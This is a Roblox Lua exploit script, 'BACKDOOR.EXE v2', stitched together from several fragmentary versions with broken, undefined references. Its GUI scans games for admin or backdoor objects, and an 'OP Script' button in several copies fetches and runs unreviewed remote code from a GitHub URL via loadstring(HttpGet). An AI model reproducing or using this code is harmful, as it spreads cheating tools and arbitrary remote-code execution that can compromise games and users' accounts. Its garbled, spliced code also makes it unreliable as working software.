-- BACKDOOR.EXE v2 by Ozil | Rainbow GUI + Real Scanner

local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local MainFrame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Title = Instance.new("TextLabel")
local ScanButton = Instance.new("TextButton")
local ConsoleButton = Instance.new("TextButton")
local OpScriptButton = Instance.new("TextButton")

-- Rainbow Color Function
local function RainbowColor()
	local hue = tick() % 5 / 5
	return Color3.fromHSV(hue, 1, 1)
end

-- GUI Properties
MainFrame.Name = "BackdoorScanner"
MainFrame.Parent = ScreenGui
MainFrame.Size = UDim2.new(0, 350, 0, 230)
MainFrame.Position = UDim2.new(0.5, -175, 0.5, -115)
MainFrame.BackgroundColor3 = RainbowColor()
MainFrame.Active = true
MainFrame.Draggable = true

UICorner.Parent = MainFrame

Title.Name = "Title"
Title.Parent = MainFrame
Title.Text = "Backdoor.exe"
Title.Font = Enum.Font.FredokaOne
Title.TextSize = 25
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1

local function CreateButton(name, posY, text, callback)
	local btn = Instance.new("TextButton")
	btn.Name = name
	btn.Parent = MainFrame
	btn.Position = UDim2.new(0.1, 0, 0, posY)
	btn.Size = UDim2.new(0.8, 0, 0, 40)
	btn.Text = text
	btn.Font = Enum.Font.FredokaOne
	btn.TextSize = 20
	btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	btn.MouseButton1Click:Connect(callback)
	return btn
end

-- Scanner logic
local function ScanGame()
	local found = {}
	local keywords = {"HD Admin", "Kohls", "Backdoor", "RemoteEvent", "require"}

	for _, s in ipairs(game:GetDescendants()) do
		for _, k in ipairs(keywords) do
			if s:IsA("Folder") or s:IsA("ModuleScript") or s:IsA("RemoteEvent") or s:IsA("RemoteFunction") then
				if string.find(string.lower(s.Name), string.lower(k)) then
					table.insert(found, s:GetFullName())
				end
			end
		end
	end

	if #found == 0 then
		warn("[Scanner] No known backdoors or admin scripts found.")
	else
		warn("[Scanner] Found potential backdoors:")
		for _, v in ipairs(found) do
			warn(" - " .. v)
		end
	end
end

-- Add buttons
CreateButton("Scan", 60, "Scan Game", ScanGame)
CreateButton("Console", 110, "Open Console", function()
	game:GetService("StarterGui"):SetCore("DevConsoleVisible", true)
end)
CreateButton("OP", 160, "Load OP Script", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/zazol666/scanner/refs/heads/main/backdoor", true))()
end)

-- Rainbow Background Loop
task.spawn(function()
	while true do
		MainFrame.BackgroundColor3 = RainbowColor()
		wait()
	end
end)OutputBox.TextSize = 14
OutputBox.TextWrapped = true
OutputBox.TextYAlignment = Enum.TextYAlignment.Top
Instance.new("UICorner", OutputBox)

-- Rainbow effect
local function RainbowColor()
    local h = tick() % 5 / 5
    return Color3.fromHSV(h, 1, 1)
end
task.spawn(function()
    while true do
        MainFrame.BackgroundColor3 = RainbowColor()
        task.wait()
    end
end)

-- Scan for HD Admin
ScanBtn.MouseButton1Click:Connect(function()
    local found = false
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("Folder") and v.Name:lower():match("hdadmin") then
            OutputBox.Text = "✅ Found HD Admin: " .. v:GetFullName()
            found = true
            break
        end
    end
    if not found then
        OutputBox.Text = "❌ No HD Admin folder found."
    end
end)

-- Open Console
ConsoleBtn.MouseButton1Click:Connect(function()
    setclipboard("Press F9 or View > Console")
    OutputBox.Text = "📋 Console tip copied to clipboard!"
end)

-- Load OP Script
OpBtn.MouseButton1Click:Connect(function()
    local s, e = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/zazol666/scanner/refs/heads/main/backdoor", true))()
    end)
    OutputBox.Text = s and "⚡ OP Script Loaded!" or ("❌ Failed: " .. e)
end)end

-- Scroll results
local results = Instance.new("ScrollingFrame", frame)
results.Size = UDim2.new(0.9,0,0,210)
results.Position = UDim2.new(0.05,0,0,185)
results.CanvasSize = UDim2.new(0,0,5,0)
results.ScrollBarThickness = 5
results.BackgroundColor3 = Color3.fromRGB(25,25,25)
results.BorderSizePixel = 0
Instance.new("UICorner", results).CornerRadius = UDim.new(0,6)
local layout = Instance.new("UIListLayout", results)
layout.Padding = UDim.new(0,4)

local function AddResult(text, color)
    local lbl = Instance.new("TextLabel")
    lbl.Text = text
    lbl.Size = UDim2.new(1,-10,0,22)
    lbl.BackgroundTransparency = 1
    lbl.TextColor3 = color or Color3.fromRGB(255,255,255)
    lbl.Font = Enum.Font.Gotham
    lbl.TextSize = 15
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = results
end

-- Scan logic
local keywords = {"HDAdmin","Adonis","Kohls","Backdoor","RemoteEvent","RemoteFunction","Script"}
local function deepScan(obj)
    for _, v in pairs(obj:GetDescendants()) do
        for _, word in ipairs(keywords) do
            if string.find(v.Name:lower(), word:lower()) then
                AddResult("⚠️ Found: "..v:GetFullName(), Color3.fromRGB(255,100,100))
            end
        end
    end
end

local function runScan()
    results:ClearAllChildren()
    AddResult("🔎 Scanning...", Color3.fromRGB(150,255,150))
    local services = { game.Workspace, game.Lighting, game.ReplicatedStorage, game.ServerScriptService,
                       game.StarterPlayer, game.StarterGui, game.Players, game.ServerStorage }
    for _, s in ipairs(services) do pcall(function() deepScan(s) end) end
    AddResult("✅ Scan complete!", Color3.fromRGB(100,255,100))
end

btnInstances["🔍 Scan Game"].MouseButton1Click:Connect(runScan)
btnInstances["🖥️ Open Console"].MouseButton1Click:Connect(function()
    game:GetService("StarterGui"):SetCore("DevConsoleVisible", true)
end)
btnInstances["💀 OP Script"].MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/zazol666/scanner/refs/heads/main/backdoor", true))()
end)

-- Draggable functionality
local UIS = game:GetService("UserInputService")
local dragToggle, dragStart, startPos
local dragSpeed = 0.25

frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragToggle = true
        dragStart = input.Position
        startPos = frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragToggle = false
            end
        end)
    end
end)

UIS.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement and dragToggle then
        local delta = input.Position - dragStart
        frame:TweenPosition(
            UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
                     startPos.Y.Scale, startPos.Y.Offset + delta.Y),
            "Out", "Quad", dragSpeed, true
        )
    end
end)consoleBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
consoleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
consoleBtn.Font = Enum.Font.Gotham
consoleBtn.TextSize = 18
Instance.new("UICorner", consoleBtn).CornerRadius = UDim.new(0, 6)

-- OP Script Button
local opBtn = Instance.new("TextButton", frame)
opBtn.Text = "💀 OP Script"
opBtn.Size = UDim2.new(0.9, 0, 0, 35)
opBtn.Position = UDim2.new(0.05, 0, 0, 140)
opBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
opBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
opBtn.Font = Enum.Font.Gotham
opBtn.TextSize = 18
Instance.new("UICorner", opBtn).CornerRadius = UDim.new(0, 6)

-- Result Output
local results = Instance.new("ScrollingFrame", frame)
results.Size = UDim2.new(0.9, 0, 0, 210)
results.Position = UDim2.new(0.05, 0, 0, 185)
results.CanvasSize = UDim2.new(0, 0, 5, 0)
results.ScrollBarThickness = 5
results.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
results.BorderSizePixel = 0
Instance.new("UICorner", results).CornerRadius = UDim.new(0, 6)

local layout = Instance.new("UIListLayout", results)
layout.Padding = UDim.new(0, 4)

-- Add result line
local function AddResult(text, color)
	local lbl = Instance.new("TextLabel")
	lbl.Text = text
	lbl.Size = UDim2.new(1, -10, 0, 22)
	lbl.BackgroundTransparency = 1
	lbl.TextColor3 = color or Color3.fromRGB(255, 255, 255)
	lbl.Font = Enum.Font.Gotham
	lbl.TextSize = 15
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.Parent = results
end

-- Keywords to check for
local keywords = {"HDAdmin", "Adonis", "Kohls", "Backdoor", "RemoteEvent", "RemoteFunction", "Script"}

-- Deep scan
local function deepScan(obj)
	for _, v in pairs(obj:GetDescendants()) do
		for _, word in pairs(keywords) do
			if string.find(v.Name:lower(), word:lower()) then
				AddResult("⚠️ Found: " .. v:GetFullName(), Color3.fromRGB(255, 100, 100))
			end
		end
	end
end

-- Run scan
local function runScan()
	results:ClearAllChildren()
	layout.Parent = results
	AddResult("🔎 Scanning...", Color3.fromRGB(150, 255, 150))

	local services = {
		game.Workspace,
		game.Lighting,
		game.ReplicatedStorage,
		game.ServerScriptService,
		game.StarterPlayer,
		game.StarterGui,
		game.Players,
		game.ServerStorage,
	}

	for _, service in pairs(services) do
		pcall(function()
			deepScan(service)
		end)
	end

	AddResult("✅ Scan complete!", Color3.fromRGB(100, 255, 100))
end

-- Button handlers
scanBtn.MouseButton1Click:Connect(runScan)

consoleBtn.MouseButton1Click:Connect(function()
	game:GetService("StarterGui"):SetCore("DevConsoleVisible", true)
end)

opBtn.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/zazol666/scanner/refs/heads/main/backdoor", true))()
end)
